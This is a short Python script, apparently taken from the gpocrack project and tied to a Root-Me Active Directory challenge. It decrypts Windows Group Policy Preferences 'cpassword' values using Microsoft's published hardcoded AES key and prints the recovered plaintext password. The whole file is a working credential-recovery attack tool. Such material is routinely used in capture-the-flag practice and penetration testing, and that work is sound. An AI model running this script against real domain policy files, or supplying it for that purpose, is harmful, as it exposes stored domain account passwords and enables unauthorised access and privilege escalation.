# source : https://github.com/MartinIngesen/gpocrack
# autre lien explicatif : https://digitalitskills.com/root-me-active-directory%E2%80%8A-gpo/
import sys
import base64
from Crypto.Cipher import AES

if len(sys.argv) != 2:
    print("Incorrect amount of arguments.")
    print("How to use:")
    print("$ python {} LjFWQMzS3GWDeav7+0Q0oSoOM43VwD30YZDVaItj8e0".format(sys.argv[0]))
    sys.exit()

cpassword = sys.argv[1]

while len(cpassword) % 4 > 0:
    cpassword += "="

decoded_password = base64.b64decode(cpassword)

# This is a Microsoft hardcoded key used to decrypt the GPO hash.
# source : https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be
key = b'\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b'

decryption_suite = AES.new(key, AES.MODE_CBC, '\x00'*16)
plain_text = decryption_suite.decrypt(decoded_password)

print("Password is: {}".format(plain_text.strip()))

password_list = (plain_text.decode().split('\x00'))
password = ''.join(str(i) for i in password_list)

print("Password is:", password.replace('\n',''))
